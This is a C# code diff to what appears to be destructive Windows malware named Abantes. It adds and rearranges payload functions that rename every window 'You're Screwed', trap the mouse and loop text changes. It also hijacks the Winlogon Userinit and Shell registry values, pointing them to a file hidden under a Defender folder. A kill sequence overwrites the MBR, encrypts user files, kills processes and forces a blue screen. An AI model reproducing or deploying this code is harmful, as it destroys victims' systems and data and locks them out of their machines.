@@ -20,14 +20,6 @@ namespace Abantes.Payloads
     {
         [DllImport("user32.dll")]
         static extern int SetWindowText(IntPtr hWnd, string text);
-        public static void ChangeWindowText()
-        {
-            Process[] allProcesses = Process.GetProcesses();
-            for (int i = 0; i < allProcesses.Length; i++)
-            {
-                SetWindowText(allProcesses[i].MainWindowHandle, "You're Screwed");
-            }
-        }
         [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?Screen_Screw@Payloads@1@QAEXXZ")]
         public static extern void Screen_Screw();
         [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?Screen_Glitching@Payloads@1@QAEXXZ")]
@@ -48,6 +40,14 @@ namespace Abantes.Payloads
         public static extern void ChangeAllText();
         static Point Position;
         static Random _random = new Random();
+        public static void ChangeWindowText()
+        {
+            Process[] allProcesses = Process.GetProcesses();
+            for (int i = 0; i < allProcesses.Length; i++)
+            {
+                SetWindowText(allProcesses[i].MainWindowHandle, "You're Screwed");
+            }
+        }
         public static void MouseTrap()
         {
             int x = SystemInformation.VirtualScreen.Width / 2;
@@ -58,6 +58,14 @@ namespace Abantes.Payloads
             {
                 Thread.Sleep(0200);
                 Cursor.Position = Position;
+            }
+        }
+        public static void ChangeText()
+        {
+            while (true)
+            {
+                ChangeAllText();
+                Thread.Sleep(1000);
             }
         }
         public static void RandomKeyboard()
@@ -127,17 +135,23 @@ namespace Abantes.Payloads
         }
         public static void UserInitOverwrite()
         {
-            RegistryKey editKey;
-            editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\WinLogon");
-            editKey.SetValue("Userinit", @"C:\Windows\Defender\LogonUIStart.exe,");
-            editKey.Close();
+            try
+            {
+                RegistryKey editKey;
+                editKey = Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Winlogon");
+                editKey.SetValue("Userinit", @"C:\Windows\Defender\LogonUIStart.exe,");
+                editKey.Close();
+            } catch { }
         }
         public static void ExplorerOverwrite()
         {
-            RegistryKey editKey;
-            editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\WinLogon");
-            editKey.SetValue("Shell", @"C:\Windows\Defender\LogonUIStart.exe");
-            editKey.Close();
+            try
+            {
+                RegistryKey editKey;
+                editKey = Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Winlogon");
+                editKey.SetValue("Shell", @"C:\Windows\Defender\LogonUIStart.exe");
+                editKey.Close();
+            } catch { }
         }
         public static void EncryptUserFiles()
         {
@@ -224,11 +238,11 @@ namespace Abantes.Payloads
             }
             else
             {
-                EncryptUserFiles();
                 LogonUIOverwrite();
                 ExplorerOverwrite();
                 UserInitOverwrite();
                 MBR_Overwrite();
+                EncryptUserFiles();
                 KillAll();
                 FORCE_BSOD();
             }
@@ -488,13 +502,13 @@ namespace Abantes.Payloads
                         {
                             if (MessageBox.Show("START CHANGE ALL TEXT PAYLOAD", "DEBUG", MessageBoxButtons.YesNo) == DialogResult.Yes)
                             {
-                                Thread CAT = new Thread(new ThreadStart(Annoying.ChangeAllText));
+                                Thread CAT = new Thread(new ThreadStart(Annoying.ChangeText));
                                 CAT.Start();
                             }
                         }
                         else
                         {
-                            Thread CAT = new Thread(new ThreadStart(Annoying.ChangeAllText));
+                            Thread CAT = new Thread(new ThreadStart(Annoying.ChangeText));
                             CAT.Start();
                         }
                         break;
